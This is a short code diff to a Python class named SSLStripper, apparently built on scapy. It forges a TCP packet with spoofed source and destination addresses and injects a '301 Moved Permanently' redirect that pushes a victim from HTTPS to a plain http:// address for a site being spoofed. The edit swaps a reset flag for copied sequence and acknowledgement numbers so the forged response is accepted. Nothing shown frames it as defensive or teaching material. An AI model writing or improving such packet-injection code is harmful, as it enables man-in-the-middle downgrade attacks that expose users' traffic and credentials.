@@ -59,7 +59,7 @@ class SSLStripper:
             # Construct the HTTP response
             response = (
                 IP(dst=packet[IP].src, src=packet[IP].dst)
-                / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags="R")
+                / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, seq=packet[TCP].ack, ack=packet[TCP].seq + 1)
                 / Raw(load="HTTP/1.1 301 Moved Permanently\nLocation: http://{}".format(self.site_to_spoof))
             )
 
